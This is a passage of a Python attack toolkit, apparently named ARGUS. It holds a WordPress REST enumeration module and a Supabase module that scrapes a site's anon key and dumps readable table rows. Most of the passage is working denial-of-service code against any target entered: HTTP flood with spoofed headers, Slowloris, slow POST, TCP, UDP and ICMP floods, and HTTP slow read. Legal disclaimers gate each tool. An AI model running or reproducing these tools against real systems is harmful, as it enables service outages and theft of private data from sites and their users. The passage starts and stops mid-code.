            print(f"\n    {R}Total users enumerated: {len(users_found)}{RST}")
    except Exception as e:
        print_warn(f"User enumeration failed: {e}")

    # 4. Try accessing private/draft posts
    print(f"\n  {M}── Private/Draft Post Access ──{RST}\n")
    try:
        for status in ("private", "draft", "pending", "future"):
            posts_url = f"{api_base}/wp/v2/posts?status={status}&per_page=5" if "rest_route" not in api_base else f"{api_base}/wp/v2/posts&status={status}&per_page=5"
            r = session.get(posts_url, timeout=8)
            if r.status_code == 200:
                posts = r.json()
                if isinstance(posts, list) and posts:
                    print(f"    {R}[EXPOSED]{RST} {len(posts)} {status} post(s) accessible!")
                    for p in posts[:3]:
                        title = p.get("title", {}).get("rendered", "N/A")
                        print(f"             • {title}")
                else:
                    print(f"    {G}[SAFE]{RST}    {status} posts: not accessible")
            elif r.status_code == 401:
                print(f"    {G}[SAFE]{RST}    {status} posts: requires authentication")
            else:
                print(f"    {W}[{r.status_code}]{RST}     {status} posts: HTTP {r.status_code}")
    except Exception as e:
        print_warn(f"Post access test failed: {e}")

    # 5. Media/upload enumeration
    print(f"\n  {M}── Media Enumeration ──{RST}\n")
    try:
        media_url = f"{api_base}/wp/v2/media?per_page=20" if "rest_route" not in api_base else f"{api_base}/wp/v2/media&per_page=20"
        r = session.get(media_url, timeout=8)
        if r.status_code == 200:
            media = r.json()
            if isinstance(media, list) and media:
                print(f"    {Y}[INFO]{RST} {len(media)} media item(s) accessible")
                for m in media[:5]:
                    src = m.get("source_url", "N/A")
                    mime = m.get("mime_type", "?")
                    print(f"             {C}•{RST} [{mime}] {src}")
                total_header = r.headers.get("X-WP-Total", "?")
                print(f"    {Y}Total media items:{RST} {total_header}")
            else:
                print_ok("No media items accessible")
        else:
            print_ok("Media endpoint not accessible (requires auth)")
    except Exception as e:
        print_warn(f"Media enumeration failed: {e}")

    # 6. Application Passwords check
    print(f"\n  {M}── Application Passwords Endpoint ──{RST}\n")
    try:
        app_pwd_url = f"{api_base}/wp/v2/users/me/application-passwords" if "rest_route" not in api_base else f"{api_base}/wp/v2/users/me/application-passwords"
        r = session.get(app_pwd_url, timeout=8)
        if r.status_code == 200:
            print(f"    {R}[VULN]{RST} Application Passwords endpoint accessible without auth!")
        elif r.status_code == 401:
            print(f"    {G}[SAFE]{RST} Application Passwords requires authentication")
        else:
            print(f"    {W}[{r.status_code}]{RST} Application Passwords endpoint returned HTTP {r.status_code}")
    except Exception:
        pass

    # 7. Settings exposure check
    print(f"\n  {M}── Settings Exposure ──{RST}\n")
    try:
        settings_url = f"{api_base}/wp/v2/settings" if "rest_route" not in api_base else f"{api_base}/wp/v2/settings"
        r = session.get(settings_url, timeout=8)
        if r.status_code == 200:
            settings = r.json()
            if isinstance(settings, dict) and settings:
                print(f"    {R}[VULN]{RST} Site settings exposed without authentication!")
                for k, v in list(settings.items())[:10]:
                    print(f"             {C}{k}:{RST} {v}")
        elif r.status_code == 401:
            print(f"    {G}[SAFE]{RST} Settings require authentication")
        else:
            print(f"    {W}[{r.status_code}]{RST} Settings endpoint returned HTTP {r.status_code}")
    except Exception:
        pass

    # 8. Check additional interesting endpoints
    print(f"\n  {M}── Additional Endpoint Checks ──{RST}\n")
    extra_endpoints = [
        ("/wp/v2/search?search=admin", "Search API"),
        ("/wp/v2/categories", "Categories"),
        ("/wp/v2/tags", "Tags"),
        ("/wp/v2/pages", "Pages"),
        ("/wp/v2/comments", "Comments"),
        ("/wp/v2/types", "Post types"),
        ("/wp/v2/statuses", "Post statuses"),
        ("/wp/v2/taxonomies", "Taxonomies"),
        ("/wp-site-health/v1/tests/background-updates", "Site Health"),
        ("/wp/v2/plugins", "Plugins (requires auth)"),
        ("/wp/v2/themes", "Themes (requires auth)"),
    ]
    for endpoint, desc in extra_endpoints:
        try:
            ep_url = f"{api_base}{endpoint}" if "rest_route" not in api_base else f"{api_base}{endpoint}"
            r = session.get(ep_url, timeout=6)
            if r.status_code == 200:
                try:
                    data = r.json()
                    count = len(data) if isinstance(data, list) else "object"
                except Exception:
                    count = "non-JSON"
                print(f"    {G}[200]{RST}  {desc:<30} items: {count}")
            elif r.status_code == 401:
                print(f"    {W}[401]{RST}  {desc:<30} (auth required)")
            elif r.status_code == 403:
                print(f"    {Y}[403]{RST}  {desc:<30} (forbidden)")
            else:
                print(f"    {W}[{r.status_code}]{RST}  {desc}")
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Users enumerated", str(len(users_found)))
    print_row("API namespaces", str(len(namespaces)))
    print_row("API routes", str(len(routes)))


# ─── 61. Supabase RLS Auditor ─────────────────────────────────────────────────

SUPABASE_COMMON_TABLES = [
    'users', 'profiles', 'todos', 'posts', 'products',
    'orders', 'settings', 'admin', 'customers', 'messages',
    'comments', 'accounts', 'sessions', 'payments', 'items',
    'categories', 'logs', 'notifications', 'tokens', 'files',
]


def _supabase_extract_config(url):
    """Scrape target URL for Supabase project URL and anon key."""
    headers = {'User-Agent': 'Mozilla/5.0 (Supabase-Security-Audit)'}
    resp = requests.get(url, headers=headers, timeout=10)
    content = resp.text

    url_pattern = r"https://([a-z0-9-]+)\.supabase\.co"
    key_pattern = r"eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+"

    project_match = re.search(url_pattern, content)
    key_matches = re.findall(key_pattern, content)

    # If not found in HTML, search external JS files
    if (not project_match or not key_matches) and BeautifulSoup:
        soup = BeautifulSoup(content, 'html.parser')
        scripts = soup.find_all('script', src=True)
        for script in scripts:
            if project_match and key_matches:
                break
            try:
                js_url = urljoin(url, script['src'])
                js_resp = requests.get(js_url, headers=headers, timeout=5)
                if not project_match:
                    project_match = re.search(url_pattern, js_resp.text)
                if not key_matches:
                    found = re.findall(key_pattern, js_resp.text)
                    if found:
                        key_matches.extend(found)
            except Exception:
                continue

    project_url = project_match.group(0) if project_match else None
    anon_key = key_matches[0] if key_matches else None
    return project_url, anon_key


def _supabase_test_rls(project_url, anon_key):
    """Discover tables and test for RLS misconfigurations."""
    headers = {
        "apikey": anon_key,
        "Authorization": f"Bearer {anon_key}",
        "Content-Type": "application/json",
    }
    base_rest_url = f"{project_url}/rest/v1/"
    tables = []

    # Table discovery via OpenAPI schema
    try:
        schema_resp = requests.get(base_rest_url, headers=headers, timeout=5)
        if schema_resp.status_code == 200:
            definitions = schema_resp.json().get('definitions', {})
            tables = list(definitions.keys())
            print_ok(f"Schema found — {len(tables)} tables detected")
        else:
            print_warn("Schema hidden — falling back to common table brute-force")
            tables = list(SUPABASE_COMMON_TABLES)
    except Exception as e:
        print_err(f"Connection error: {e}")
        return [], 0, 0

    # Data extraction
    vulnerable = 0
    safe = 0
    results = []

    for table in tables:
        query_url = f"{base_rest_url}{table}?select=*&limit=5"
        try:
            r = requests.get(query_url, headers=headers, timeout=5)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list) and len(data) > 0:
                    vulnerable += 1
                    results.append((table, data))
                    print(f"    {R}[VULN]{RST} {table} — RLS OFF — {len(data)} rows exposed")
                    preview = json.dumps(data, indent=2, ensure_ascii=False)
                    for line in preview.split('\n')[:6]:
                        print(f"           {W}{line}{RST}")
                    if len(preview.split('\n')) > 6:
                        print(f"           {Y}... (truncated){RST}")
                else:
                    safe += 1
                    print(f"    {G}[SAFE]{RST} {table}")
            else:
                safe += 1
                print(f"    {W}[{r.status_code}]{RST}  {table}")
        except Exception:
            print(f"    {Y}[ERR]{RST}  {table}")

    return results, vulnerable, safe


def supabase_rls_auditor():
    print_header("Supabase RLS Auditor")
    if not exploit_disclaimer():
        return

    target = prompt("Target URL (website using Supabase)")
    if not target:
        return
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    # Phase 1: extract config
    spinner("Scanning for Supabase credentials...", 1.5)
    try:
        project_url, anon_key = _supabase_extract_config(target)
    except Exception as e:
        print_err(f"Scraping error: {e}")
        project_url, anon_key = None, None

    if project_url:
        print_ok(f"Project URL: {project_url}")
    else:
        print_warn("Project URL not found automatically")

    if anon_key:
        masked = anon_key[:15] + "..." + anon_key[-10:]
        print_ok(f"Anon Key:    {masked}")
    else:
        print_warn("Anon key not found automatically")

    # Manual fallback
    if not project_url or not anon_key:
        print(f"\n  {Y}Enter credentials manually (leave blank to abort):{RST}")
        if not project_url:
            project_url = prompt("Supabase Project URL (https://xxx.supabase.co)")
        if not anon_key:
            anon_key = prompt("Anon Key")
        if not project_url or not anon_key:
            print_err("Missing credentials — aborting")
            return

    # Phase 2: RLS vulnerability scan
    print(f"\n  {Y}Testing RLS on tables...{RST}\n")
    spinner("Connecting to REST endpoint...", 1.0)

    results, vuln_count, safe_count = _supabase_test_rls(project_url, anon_key)
    total = vuln_count + safe_count

    # Summary
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Tables tested", str(total))
    print_row("Vulnerable (RLS OFF)", str(vuln_count))
    print_row("Safe", str(safe_count))

    if vuln_count > 0:
        print(f"\n  {R}WARNING: {vuln_count} table(s) with publicly readable data!{RST}")
        print(f"  {Y}Recommendations:{RST}")
        print(f"    {W}1. Enable RLS on all exposed tables{RST}")
        print(f"    {W}2. Define granular access policies{RST}")
        print(f"    {W}3. Remove anon key from frontend code{RST}")
        print(f"    {W}4. Use service_role only server-side{RST}")

        # Save report
        report_file = "supabase_audit_report.txt"
        try:
            with open(report_file, "w", encoding="utf-8") as f:
                f.write(f"SUPABASE RLS AUDIT REPORT\n")
                f.write(f"Target: {target}\n")
                f.write(f"Project: {project_url}\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'=' * 50}\n\n")
                for table, data in results:
                    f.write(f"[VULNERABLE] {table}\n")
                    f.write(json.dumps(data, indent=2, ensure_ascii=False))
                    f.write(f"\n{'-' * 40}\n")
            print_ok(f"Full report saved to {report_file}")
        except Exception as e:
            print_err(f"Could not save report: {e}")
    else:
        print(f"\n  {G}No RLS misconfigurations detected.{RST}")


# ═══════════════════════════════════════════════════════════════════════════════
#                     STRESS TESTING / DoS MODULES
# ═══════════════════════════════════════════════════════════════════════════════

STRESS_DISCLAIMER = f"""
  {R}╔══════════════════════════════════════════════════════════╗
  ║{RST} {R}▓▓▓  DANGER ZONE — STRESS / DENIAL-OF-SERVICE TOOLS  ▓▓▓{RST} {R}║
  ╠══════════════════════════════════════════════════════════╣
  ║ {Y}These tools WILL disrupt or crash the target service.{R}    ║
  ║ {W}Use ONLY against infrastructure you OWN or have{R}         ║
  ║ {W}EXPLICIT WRITTEN AUTHORIZATION to test.{R}                  ║
  ║                                                          ║
  ║ {Y}Unauthorized use is a CRIMINAL OFFENSE under:{R}            ║
  ║ {W}  • CFAA (US)  • Computer Misuse Act (UK){R}               ║
  ║ {W}  • Art. 615-ter/quinquies C.P. (IT){R}                    ║
  ║ {W}  • Equivalent laws in most countries{R}                    ║
  ║                                                          ║
  ║ {R}YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS.{R}             ║
  ╚══════════════════════════════════════════════════════════╝{RST}
"""


def stress_disclaimer():
    print(STRESS_DISCLAIMER)
    c1 = input(f"  {R}Do you have WRITTEN authorization to stress-test this target? (yes/no):{RST} ").strip().lower()
    if c1 not in ("yes", "y", "si", "s"):
        return False
    c2 = input(f"  {R}Type 'I ACCEPT ALL RESPONSIBILITY' to continue:{RST} ").strip()
    if c2.upper() != "I ACCEPT ALL RESPONSIBILITY":
        print_err("Aborted. You must accept responsibility to use these tools.")
        return False
    return True


def _stress_stats(label, stop_event, counter, start_time):
    """Background thread that prints live stats every second."""
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        if elapsed > 0:
            rps = counter[0] / elapsed
            sys.stdout.write(
                f"\r  {Y}[{label}]{RST} Sent: {G}{counter[0]}{RST}  "
                f"Rate: {C}{rps:.0f}/s{RST}  "
                f"Elapsed: {W}{elapsed:.1f}s{RST}   "
            )
            sys.stdout.flush()
        time.sleep(0.5)
    print()


# ─── 41. HTTP Flood (GET/POST) ───────────────────────────────────────────────

def http_flood():
    print_header("HTTP Flood (GET/POST)")
    if not stress_disclaimer():
        return

    url = prompt("Target URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    method = input(f"  {Y}Method (GET/POST) [GET]:{RST} ").strip().upper() or "GET"
    threads = input(f"  {Y}Threads (1-200) [50]:{RST} ").strip() or "50"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"

    try:
        threads = min(200, max(1, int(threads)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    print_row("Target", url)
    print_row("Method", method)
    print_row("Threads", str(threads))
    print_row("Duration", f"{duration}s")
    print_warn("Press Ctrl+C to stop early\n")

    stop_event = threading.Event()
    counter = [0]  # mutable for threads
    errors = [0]
    start_time = time.time()

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    ]

    def flood_worker():
        session = requests.Session()
        while not stop_event.is_set():
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Cache-Control": "no-cache",
                    "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
                }
                if method == "POST":
                    data = "".join(random.choices(string.ascii_letters, k=random.randint(64, 512)))
                    session.post(url, headers=headers, data=data, timeout=5, verify=False)
                else:
                    # Add random param to bypass cache
                    sep = "&" if "?" in url else "?"
                    cache_bust = f"{sep}_={random.randint(100000,999999)}"
                    session.get(url + cache_bust, headers=headers, timeout=5, verify=False)
                counter[0] += 1
            except Exception:
                errors[0] += 1

    stats_thread = threading.Thread(target=_stress_stats, args=("HTTP FLOOD", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=flood_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Requests", str(counter[0]))
    print_row("Errors", str(errors[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} req/s" if elapsed > 0 else "N/A")


# ─── 42. Slowloris ───────────────────────────────────────────────────────────

def slowloris():
    print_header("Slowloris (Slow HTTP Headers)")
    if not stress_disclaimer():
        return

    target = prompt("Target host (domain or IP)")
    if not target:
        return
    port_s = input(f"  {Y}Port [80]:{RST} ").strip() or "80"
    sockets_s = input(f"  {Y}Sockets (1-1000) [200]:{RST} ").strip() or "200"
    duration = input(f"  {Y}Duration in seconds (1-300) [60]:{RST} ").strip() or "60"

    try:
        port = int(port_s)
        num_sockets = min(1000, max(1, int(sockets_s)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    print_row("Target", f"{target}:{port}")
    print_row("Sockets", str(num_sockets))
    print_row("Duration", f"{duration}s")
    print_warn("Press Ctrl+C to stop early\n")

    import ssl as _ssl

    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if port == 443:
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            ua = f"User-Agent: Mozilla/5.0 (ARGUS Slowloris {random.randint(0,9999)})\r\n"
            s.send(ua.encode())
            return s
        except Exception:
            return None

    socket_list = []
    stop_event = threading.Event()
    counter = [0]
    start_time = time.time()

    # Initial socket creation
    spinner("Opening initial sockets...", 0.5)
    for _ in range(num_sockets):
        s = create_socket()
        if s:
            socket_list.append(s)
            counter[0] += 1

    print_ok(f"Opened {len(socket_list)} initial connections")

    stats_thread = threading.Thread(
        target=_stress_stats, args=("SLOWLORIS", stop_event, counter, start_time)
    )
    stats_thread.daemon = True
    stats_thread.start()

    try:
        end_time = time.time() + duration
        while time.time() < end_time:
            # Send keep-alive headers
            for s in list(socket_list):
                try:
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    s.send(header.encode())
                    counter[0] += 1
                except Exception:
                    socket_list.remove(s)

            # Refill dropped sockets
            diff = num_sockets - len(socket_list)
            for _ in range(diff):
                s = create_socket()
                if s:
                    socket_list.append(s)
                    counter[0] += 1

            time.sleep(10)  # slowloris sends infrequently
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        for s in socket_list:
            try:
                s.close()
            except Exception:
                pass
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Sends", str(counter[0]))
    print_row("Peak Sockets", str(num_sockets))
    print_row("Duration", f"{elapsed:.1f}s")


# ─── 43. Slow POST (R.U.D.Y.) ────────────────────────────────────────────────

def slow_post():
    print_header("Slow POST Attack (R.U.D.Y.)")
    if not stress_disclaimer():
        return

    url = prompt("Target URL with POST endpoint (e.g. http://target.com/login)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    conns = input(f"  {Y}Connections (1-200) [50]:{RST} ").strip() or "50"
    duration = input(f"  {Y}Duration in seconds (1-300) [60]:{RST} ").strip() or "60"

    try:
        conns = min(200, max(1, int(conns)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    use_ssl = parsed.scheme == "https"
    port = 443 if use_ssl else 80
    if ":" in host:
        host, port = host.rsplit(":", 1)
        port = int(port)

    print_row("Target", url)
    print_row("Connections", str(conns))
    print_row("Duration", f"{duration}s")
    print_warn("Sends POST body byte-by-byte to exhaust server connections")
    print_warn("Press Ctrl+C to stop early\n")

    import ssl as _ssl

    stop_event = threading.Event()
    counter = [0]
    start_time = time.time()

    fake_len = random.randint(10000, 100000)

    def rudy_worker():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                if use_ssl:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.connect((host, port))

                header = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0 (ARGUS RUDY)\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {fake_len}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(header.encode())
                counter[0] += 1

                # Send body one byte at a time
                while not stop_event.is_set():
                    byte = random.choice(string.ascii_lowercase).encode()
                    s.send(byte)
                    counter[0] += 1
                    time.sleep(random.uniform(5, 15))
            except Exception:
                pass
            finally:
                try:
                    s.close()
                except Exception:
                    pass

    stats_thread = threading.Thread(target=_stress_stats, args=("SLOW POST", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(conns):
        t = threading.Thread(target=rudy_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Bytes Sent", str(counter[0]))
    print_row("Connections Used", str(conns))
    print_row("Duration", f"{elapsed:.1f}s")


# ─── 44. TCP Connection Flood ─────────────────────────────────────────────────

def tcp_flood():
    print_header("TCP Connection Flood")
    if not stress_disclaimer():
        return

    host = prompt("Target host (IP or domain)")
    if not host:
        return
    port_s = input(f"  {Y}Target port [80]:{RST} ").strip() or "80"
    threads = input(f"  {Y}Threads (1-200) [100]:{RST} ").strip() or "100"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"

    try:
        port = int(port_s)
        threads = min(200, max(1, int(threads)))
        duration = min(300, max(1, int(duration)))
    except ValueError:
        print_err("Invalid numbers")
        return

    try:
        if STEALTH["enabled"] and dns is not None:
            answers = dns.resolver.resolve(host, "A", lifetime=10)
            ip = str(answers[0])
        else:
            ip = socket.gethostbyname(host)
    except Exception:
        print_err("Could not resolve hostname")
        return

    print_row("Target", f"{ip}:{port}")
    print_row("Threads", str(threads))
    print_row("Duration", f"{duration}s")
    print_warn("Press Ctrl+C to stop early\n")

    stop_event = threading.Event()
    counter = [0]
    errors = [0]
    start_time = time.time()

    def tcp_worker():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                # Send random data
                data = bytes(random.getrandbits(8) for _ in range(random.randint(64, 1024)))
                s.send(data)
                counter[0] += 1
                s.close()
            except Exception:
                errors[0] += 1

    stats_thread = threading.Thread(target=_stress_stats, args=("TCP FLOOD", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=tcp_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Connections", str(counter[0]))
    print_row("Errors", str(errors[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} conn/s" if elapsed > 0 else "N/A")


# ─── 45. UDP Flood ────────────────────────────────────────────────────────────

def udp_flood():
    print_header("UDP Flood")
    if not _stealth_raw_socket_warning("UDP Flood"):
        return
    if not stress_disclaimer():
        return

    host = prompt("Target host (IP or domain)")
    if not host:
        return
    port_s = input(f"  {Y}Target port [53]:{RST} ").strip() or "53"
    threads = input(f"  {Y}Threads (1-100) [50]:{RST} ").strip() or "50"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"
    pkt_size = input(f"  {Y}Packet size in bytes (1-65507) [1024]:{RST} ").strip() or "1024"

    try:
        port = int(port_s)
        threads = min(100, max(1, int(threads)))
        duration = min(300, max(1, int(duration)))
        pkt_size = min(65507, max(1, int(pkt_size)))
    except ValueError:
        print_err("Invalid numbers")
        return

    try:
        if STEALTH["enabled"] and dns is not None:
            answers = dns.resolver.resolve(host, "A", lifetime=10)
            ip = str(answers[0])
        else:
            ip = socket.gethostbyname(host)
    except Exception:
        print_err("Could not resolve hostname")
        return

    print_row("Target", f"{ip}:{port}")
    print_row("Threads", str(threads))
    print_row("Packet Size", f"{pkt_size} bytes")
    print_row("Duration", f"{duration}s")
    print_warn("Press Ctrl+C to stop early\n")

    stop_event = threading.Event()
    counter = [0]
    bytes_sent = [0]
    start_time = time.time()

    def udp_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = bytes(random.getrandbits(8) for _ in range(pkt_size))
        while not stop_event.is_set():
            try:
                sock.sendto(payload, (ip, port))
                counter[0] += 1
                bytes_sent[0] += pkt_size
            except Exception:
                pass
        sock.close()

    stats_thread = threading.Thread(target=_stress_stats, args=("UDP FLOOD", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=udp_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    mb = bytes_sent[0] / (1024 * 1024)
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Packets", str(counter[0]))
    print_row("Data Sent", f"{mb:.1f} MB")
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} pkt/s" if elapsed > 0 else "N/A")
    print_row("Throughput", f"{mb/elapsed:.1f} MB/s" if elapsed > 0 else "N/A")


# ─── 46. ICMP Ping Flood ─────────────────────────────────────────────────────

def icmp_flood():
    print_header("ICMP Ping Flood")
    if not _stealth_raw_socket_warning("ICMP Flood"):
        return
    if not stress_disclaimer():
        return

    host = prompt("Target host (IP or domain)")
    if not host:
        return
    threads = input(f"  {Y}Threads (1-50) [10]:{RST} ").strip() or "10"
    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"
    pkt_size = input(f"  {Y}Payload size in bytes (1-65500) [1024]:{RST} ").strip() or "1024"

    try:
        threads = min(50, max(1, int(threads)))
        duration = min(300, max(1, int(duration)))
        pkt_size = min(65500, max(1, int(pkt_size)))
    except ValueError:
        print_err("Invalid numbers")
        return

    try:
        if STEALTH["enabled"] and dns is not None:
            answers = dns.resolver.resolve(host, "A", lifetime=10)
            ip = str(answers[0])
        else:
            ip = socket.gethostbyname(host)
    except Exception:
        print_err("Could not resolve hostname")
        return

    print_row("Target", ip)
    print_row("Threads", str(threads))
    print_row("Payload Size", f"{pkt_size} bytes")
    print_row("Duration", f"{duration}s")
    print_warn("Requires root/sudo for raw sockets")
    print_warn("Press Ctrl+C to stop early\n")

    def _checksum(data):
        s = 0
        n = len(data) % 2
        for i in range(0, len(data) - n, 2):
            s += (data[i]) + ((data[i + 1]) << 8)
        if n:
            s += data[-1]
        while (s >> 16):
            s = (s & 0xFFFF) + (s >> 16)
        s = ~s & 0xFFFF
        return s

    def build_icmp_packet(payload_size):
        icmp_type = 8  # Echo request
        icmp_code = 0
        checksum = 0
        identifier = random.randint(0, 65535)
        sequence = random.randint(0, 65535)
        payload = bytes(random.getrandbits(8) for _ in range(payload_size))
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, identifier, sequence)
        checksum = _checksum(header + payload)
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, identifier, sequence)
        return header + payload

    stop_event = threading.Event()
    counter = [0]
    errors = [0]
    start_time = time.time()

    def icmp_worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            errors[0] += 1
            return

        while not stop_event.is_set():
            try:
                packet = build_icmp_packet(pkt_size)
                sock.sendto(packet, (ip, 0))
                counter[0] += 1
            except Exception:
                errors[0] += 1
        sock.close()

    stats_thread = threading.Thread(target=_stress_stats, args=("ICMP FLOOD", stop_event, counter, start_time))
    stats_thread.daemon = True
    stats_thread.start()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=icmp_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        time.sleep(1)

    elapsed = time.time() - start_time
    if errors[0] > 0 and counter[0] == 0:
        print_err("Failed — raw sockets require root/sudo privileges")
        return

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Total Packets", str(counter[0]))
    print_row("Errors", str(errors[0]))
    print_row("Duration", f"{elapsed:.1f}s")
    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} pkt/s" if elapsed > 0 else "N/A")


# ─── 47. HTTP Slow Read ──────────────────────────────────────────────────────

def http_slow_read():
    print_header("HTTP Slow Read")
    if not stress_disclaimer():
        return

    url = prompt("Target URL (preferably a large page/file)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    conns = input(f"  {Y}Connections (1-200) [50]:{RST} ").strip() or "50"
    duration = input(f"  {Y}Duration in seconds (1-300) [60]:{RST} ").strip() or "60"
    read_rate = input(f"  {Y}Read rate bytes/sec (1-100) [1]:{RST} ").strip() or "1"

    try:
        conns = min(200, max(1, int(conns)))
        duration = min(300, max(1, int(duration)))
        read_rate = min(100, max(1, int(read_rate)))
    except ValueError:
        print_err("Invalid numbers")
        return

    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    use_ssl = parsed.scheme == "https"
    port = 443 if use_ssl else 80
    if ":" in host:
        host, port_s = host.rsplit(":", 1)
        port = int(port_s)

    print_row("Target", url)
    print_row("Connections", str(conns))
    print_row("Read Rate", f"{read_rate} byte(s)/sec")
    print_row("Duration", f"{duration}s")
    print_warn("Ties up server connections by reading responses extremely slowly")
    print_warn("Press Ctrl+C to stop early\n")

    import ssl as _ssl

    stop_event = threading.Event()
    counter = [0]  # bytes read
    active = [0]
    start_time = time.time()

    def slow_reader():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                if use_ssl:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.connect((host, port))
                active[0] += 1

                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0 (ARGUS SlowRead)\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(request.encode())

                # Read response extremely slowly
                s.settimeout(30)
                while not stop_event.is_set():
